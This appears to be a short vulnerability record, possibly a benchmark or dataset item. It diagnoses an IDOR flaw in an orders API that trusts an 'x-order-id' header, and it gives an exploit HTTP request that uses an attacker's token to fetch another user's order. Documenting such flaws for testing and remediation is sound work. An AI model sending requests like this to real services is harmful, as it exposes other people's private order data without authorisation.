diagnosis: The endpoint retrieves an order using an ID from the 'x-order-id' header. It fails to check if the authenticated user is the owner of the order, allowing an attacker to access other users' orders by modifying the header.
exploit_request:
GET /api/users/orders HTTP/1.1
Host: api.example.com
x-order-id: 507f1f77bcf86cd799439011
Authorization: Bearer <attacker_token>
